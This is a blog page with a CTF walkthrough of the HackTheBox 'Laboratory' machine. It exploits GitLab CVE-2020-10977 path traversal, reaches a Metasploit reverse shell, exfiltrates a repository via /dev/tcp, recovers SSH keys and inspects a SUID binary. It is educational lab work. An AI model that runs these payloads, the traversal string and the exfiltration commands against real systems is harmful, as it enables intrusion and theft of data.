<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Laboratory | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting,GitLab"><meta name=description content="LFI to RCE on GitLab 12.8.1~12.9.0"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/laboratory/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Laboratory"><meta property="og:description" content="LFI to RCE on GitLab 12.8.1~12.9.0"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/laboratory/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-04-17T23:25:49+07:00"><meta property="article:modified_time" content="2021-04-17T23:25:49+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004.png"><meta name=twitter:title content="HackTheBox - Laboratory"><meta name=twitter:description content="LFI to RCE on GitLab 12.8.1~12.9.0"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Laboratory","item":"https://fahmifj.github.io/hackthebox/laboratory/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Laboratory","name":"HackTheBox - Laboratory","description":"LFI to RCE on GitLab 12.8.1~12.9.0","keywords":["HackTheBox","CTF","Cyber Security","Pentesting","GitLab"],"articleBody":"Laboratory is features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application’s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine. From there, I’m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls chmod with relative path, making it vulnerable to path hijacking.\nSkills Learned Arbitrary File Read Adding Metasploit module Exploiting GitLab 12.8.1~12.9.0 Recover a git repository SUID exploitation Tools Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Metasploit - Preinstalled in Kali Linux CVE-2020-10997 Exploit PoC - https://github.com/thewhiteh4t/cve-2020-10977 Reconnaissance Nmap Initial scan with nmap shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.\n→ root@iamf «laboratory» «10.10.14.39» $ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216 ...[SNIP]... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Issuer: commonName=laboratory.htb | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-07-05T10:39:28 | Not valid after: 2024-03-03T10:39:28 | MD5: 2873 91a5 5022 f323 4b95 df98 b61a eb6c |_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ...[SNIP]... From the scan above, visiting port 80 will be redirected to https://laboratory.htb.\nOn the HTTPS port, the certificate discloses a subdomain.\nFrom here, I’ll add laboratory.htb and git.laboratory.htb as well to /etc/hosts\n→ root@iamf «laboratory» «10.10.14.39» $ echo '10.10.10.216 laboratory.htb git.laboratory.htb' \u003e /etc/hosts Enumeration TCP 80 - laboratory.htb There is nothing really interesting here.\nTCP 443 - git.laboratory.htb A GitLab instance is presented on this page.\nI tried to register an account, but GitLab rejected it by saying the email domain was not authorized.\nI changed my email to iamf@laboratory.htb and it works.\nThe first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.\nI found another user on this website named Dexter McPherson. This user has a project called SecureWebsite\nSearchsploit searchsploit shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.\n→ root@iamf «laboratory» «10.10.14.39» $ searchsploit gitlab ------------------------------------------------------------------------- ----------------------------- Exploit Title | Path ------------------------------------------------------------------------- ----------------------------- GitLab - 'impersonate' Feature Privilege Escalation | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py GitLab 12.9.0 - Arbitrary File Read | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated) | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit) | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution | json/webapps/47420.txt ------------------------------------------------------------------------- ------------------------------ Foothold Shell as git GitLab CVE-2020-10977 - Manual CVE-2020-10977: GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.\nThe arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at Hackerone. The researcher also shows how that vulnerability can be turned into a remote code execution.\nI’ll reproduce the vulnerability by creating two projects. I’ll name it as “project1” and “project2”.\nAfter that I’ll create an issue on “project2” and fill the issue description with a payload as follows:\n![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd) I’ll then move the issue on “project2” to “project1”\nThe payload will then turn into an attached file.\nThe attached file contains the content of /etc/passwd file from the system.\nGitLab CVE-2020-10977 - Automated There is also an automated version to exploit this vulnerability written in Python.\n→ root@iamf «laboratory» «10.10.14.39» $ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf ...... [+] Target : https://git.laboratory.htb [+] Username : iamf [+] Password : iamfiamf [+] Project Names : ProjectOne, ProjectTwo [!] Trying to Login... [+] Login Successful! [!] Creating ProjectOne... [+] ProjectOne Created Successfully! [!] Creating ProjectTwo... [+] ProjectTwo Created Successfully! [\u003e] Absolute Path to File : /etc/passwd [!] Creating an Issue... [+] Issue Created Successfully! [!] Moving Issue... [+] Issue Moved Successfully! [+] File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd \u003e /etc/passwd ---------------------------------------- ...... git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh ...... LFI to RCE To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab secret_key_base with the one on Laboratory (located on /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml). After that all is set, I’ve to craft my own cookie to get the code execution on the system.\nFortunately, there is a Metasploit module to perform this automatically, and I’ll use that.\nFirst, I’ll have to grab the module from GitHub and put it into /usr/share/metasploit-framework/modules/exploits/multi/http.\n→ root@iamf «laboratory» «10.10.14.39» $ cd /usr/share/metasploit-framework/modules/exploits/multi/http \u0026\u0026 wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb After that I’ll re-initialize the metasploit database using msfdb.\n→ root@iamf «laboratory» «10.10.14.39» $ msfdb reinit [+] Starting database [+] Dropping databases 'msf' [+] Dropping databases 'msf_test' [+] Dropping database user 'msf' [+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml [+] Stopping database [+] Starting database [+] Creating database user 'msf' [+] Creating databases 'msf' [+] Creating databases 'msf_test' [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml' [+] Creating initial database schema Now on Metasploit, I can use the module by issuing the command below:\nmsf6 \u003e use exploit/multi/http/gitlab_file_read_rce [*] No payload configured, defaulting to generic/shell_reverse_tcp Below are the options needed by the module.\nmsf6 exploit(multi/http/gitlab_file_read_rce) \u003e set USERNAME iamf USERNAME =\u003e iamf msf6 exploit(multi/http/gitlab_file_read_rce) \u003e set PASSWORD iamfiamf PASSWORD =\u003e iamfiamf msf6 exploit(multi/http/gitlab_file_read_rce) \u003e set RHOSTS 10.10.10.216 RHOSTS =\u003e 10.10.10.216 msf6 exploit(multi/http/gitlab_file_read_rce) \u003e set RPORT 443 RPORT =\u003e 443 msf6 exploit(multi/http/gitlab_file_read_rce) \u003e set SSL true [!] Changing the SSL option’s value may require changing RPORT! SSL =\u003e true msf6 exploit(multi/http/gitlab_file_read_rce) \u003e set VHOST git.laboratory.htb VHOST =\u003e git.laboratory.htb msf6 exploit(multi/http/gitlab_file_read_rce) \u003e set LHOST tun0 LHOST =\u003e tun0 msf6 exploit(multi/http/gitlab_file_read_rce) \u003e set LPORT 9001 LPORT =\u003e 9001 After all the required options are set, I’ll start the exploit with the run command.\nmsf6 exploit(multi/http/gitlab_file_read_rce) \u003e run [*] Started reverse TCP handler on 10.10.14.39:9001 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version. [*] Logged in to user iamf [*] Created project /iamf/hpt2TORA [*] Created project /iamf/ysGE0u0L [*] Created issue /iamf/hpt2TORA/issues/1 [*] Executing arbitrary file load [+] File saved as: '/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt' [+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 [*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read [*] Attempting to delete project /iamf/hpt2TORA [*] Deleted project /iamf/hpt2TORA [*] Attempting to delete project /iamf/ysGE0u0L [*] Deleted project /iamf/ysGE0u0L [*] Command shell session 1 opened (10.10.14.39:9001 -\u003e 10.10.10.216:52726) at 2021-03-21 17:46:14 -0400 id;hostname uid=998(git) gid=998(git) groups=998(git) git.laboratory.htb I have shell as user git.\nThere is a .dockerenv file in the root directory, which indicates that I’m inside a docker container.\nls -la / total 88 drwxr-xr-x 1 root root 4096 Jul 2 2020 . drwxr-xr-x 1 root root 4096 Jul 2 2020 .. -rwxr-xr-x 1 root root 0 Jul 2 2020 .dockerenv -rw-r--r-- 1 root root 157 Feb 24 2020 RELEASE drwxr-xr-x 2 root root 4096 Feb 24 2020 assets Privilege Escalation Shell as dexter Container enumeration Enumerating the git home directory (/var/opt/gitlab) discovers two repositories that belongs to user dexter.\ngit@git:~$ grep -Ri dexter 2\u003e/dev/null git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config: fullpath = dexter/securedocker git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config: fullpath = dexter/securewebsite I haven’t seen that dexter/securedocker before in the GitLab application. So I’ll grab that repository and transfer it to my machine\ngit@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git total 40 drwxr-s--- 6 git root 4096 Jul 5 2020 . drwxr-s--- 4 git root 4096 Jul 5 2020 .. -rw-r--r-- 1 git root 23 Jul 5 2020 HEAD -rw-r--r-- 1 git root 107 Jul 5 2020 config -rw-r--r-- 1 git root 73 Jul 5 2020 description drwxr-sr-x 2 git root 4096 Jul 5 2020 hooks drwxr-sr-x 2 git root 4096 Jul 5 2020 info -rw-r--r-- 1 git root 112 Jul 5 2020 language-stats.cache drwxr-sr-x 14 git root 4096 Jul 5 2020 objects drwxr-sr-x 4 git root 4096 Jul 5 2020 refs First, I’ll create a tarball archive of that repository and I’ll name it as exfil-securedocker-git.tar.\ngit@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git On my machine, I’ll setup a listener\n→ root@iamf «loot» «10.10.14.39» $ nc -nvlp 9000 \u003e exfil-securedocker-git.tar Back on Laboratory, I’ll send the repository tarball to my machine using cat and bash trick\ngit@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar \u003e /dev/tcp/10.10.14.39/9000 My listener received the tarball.\n→ root@iamf «loot» «10.10.14.39» $ nc -nvlp 9000 \u003e exfil-securedocker-git.tar listening on [any] 9000 ... connect to [10.10.14.39] from (UNKNOWN) [10.10.10.216] 42426 Recovering ‘securedocker’ repository After extracting the repository, git:(master) popped up in my zsh prompt which indicates this is a git repository.\n→ root@iamf «loot» «10.10.14.39» $ tar -xzf exfil-securedocker-git.tar → root@iamf «loot» «10.10.14.39» $ cd 19581e27de7ced....5ef03f7c3017bb5b7.git → root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:(master) $ But, when I try to read the repository status, it returns the following errors.\n→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:(master) $ git status fatal: this operation must be run in a work tree I’ve renamed 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git to secure-docker.git.\nThis problem can be resolved by creating a new .git folder within secure-docker.git and transferring all the files from secure-docker.git to the newly created .git.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ mkdir .git → root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ mv * .git → root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ git status fatal: this operation must be run in a work tree Finally, use the git init command to re-initialize the git repository.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ git init Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/ → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ git status On branch master Changes to be committed: (use \"git restore --staged ...\" to unstage) deleted: README.md deleted: create_gitlab.sh deleted: dexter/.ssh/authorized_keys deleted: dexter/.ssh/id_rsa deleted: dexter/recipe.url deleted: dexter/todo.txt This repository contains a set of SSH keys that have been deleted. I can restore these with git checkout -- command.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ git checkout -- → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ls -la total 20 drwxr-xr-x 3 root root 4096 Mar 22 09:36 . drwxr-xr-x 4 root root 4096 Mar 22 09:36 .. -rw-r--r-- 1 root root 102 Mar 22 09:36 recipe.url drwxr-xr-x 2 root root 4096 Mar 22 09:36 .ssh -rw-r--r-- 1 root root 160 Mar 22 09:36 todo.txt SSH - dexter I can now login as dexter using the SSH key I obtained.\nAt first try, it says the key is invalid format, but this can be fixed wit by adding an empty string (newline) using the echo command.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ chmod 600 dexter/.ssh/id_rsa → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216 Load key \"id_rsa\": invalid format dexter@10.10.10.216: Permission denied (publickey). → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ echo '' \u003e\u003e dexter/.ssh/id_rsa Now it logs me in.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ssh -i id_rsa dexter@10.10.10.216 dexter@laboratory:~$ dexter@laboratory:~$ id;hostname uid=1000(dexter) gid=1000(dexter) groups=1000(dexter) laboratory dexter@laboratory:~$ ls -l total 4 -r--r----- 1 root dexter 33 Mar 22 10:06 user.txt Shell as root Enumeration The contents of todo.txt talks something about “docker security”, but I have no idea what it is except it uses three hashtags.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ cat dexter/todo.txt # DONE: Secure docker for regular users ### DONE: Automate docker security on startup # TODO: Look into \"docker compose\" # TODO: Permanently ban DeeDee from lab# It turns out it’s a binary name which has a SUID bit set found by Linpeas.\n...... ════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms -rwsr-xr-x 1 root dexter 17K Aug 28 2020 /usr/local/bin/docker-security Inspecting the binary with the ltrace command reveals that it uses relative path to call chmod.\ndexter@laboratory:~$ ltrace docker-security setuid(0) = -1 setgid(0) = -1 system(\"chmod 700 /usr/bin/docker\"chmod: changing permissions of '/usr/bin/docker': Operation not permitted ","wordCount":"2218","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004.png","datePublished":"2021-04-17T23:25:49+07:00","dateModified":"2021-04-17T23:25:49+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/laboratory/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Laboratory</h1><p class=post-description>LFI to RCE on GitLab 12.8.1~12.9.0</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>April 17, 2021
</span>&nbsp;&#183;&nbsp;<span class=meta-read>11 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---laboratoryhtb aria-label="TCP 80 - laboratory.htb">TCP 80 - laboratory.htb</a></li><li><a href=#tcp-443---gitlaboratoryhtb aria-label="TCP 443 - git.laboratory.htb">TCP 443 - git.laboratory.htb</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-git aria-label="Shell as git">Shell as git</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-dexter aria-label="Shell as dexter">Shell as dexter</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004_hub435ce2436f9d27618c0e05b498b6e7f_122027_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004_hub435ce2436f9d27618c0e05b498b6e7f_122027_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004_hub435ce2436f9d27618c0e05b498b6e7f_122027_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004.png 733w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/laboratory/imgs/image-20210418003340004.png alt="HackTheBox - Laboratory" width=733 height=463><p>HackTheBox - Laboratory</p></figure><p>Laboratory is features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine. From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Arbitrary File Read</li><li>Adding Metasploit module</li><li>Exploiting GitLab 12.8.1~12.9.0</li><li>Recover a git repository</li><li>SUID exploitation</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>Metasploit - Preinstalled in Kali Linux</li><li>CVE-2020-10997 Exploit PoC - <a href=https://github.com/thewhiteh4t/cve-2020-10977>https://github.com/thewhiteh4t/cve-2020-10977</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class=line><span class=cl>$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp  open  http     Apache httpd 2.4.41
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://laboratory.htb/
</span></span><span class=line><span class=cl>443/tcp open  ssl/http Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: The Laboratory
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>laboratory.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:git.laboratory.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>laboratory.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>4096</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2020-07-05T10:39:28
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid after:  2024-03-03T10:39:28
</span></span><span class=line><span class=cl><span class=p>|</span> MD5:   <span class=m>2873</span> 91a5 <span class=m>5022</span> f323 4b95 df98 b61a eb6c
</span></span><span class=line><span class=cl><span class=p>|</span>_SHA-1: <span class=m>0875</span> 3a7e eef6 8f50 <span class=m>0349</span> 510d 9fbf abc3 c70a a1ca
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p><p>On the HTTPS port, the certificate discloses a subdomain.</p><p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
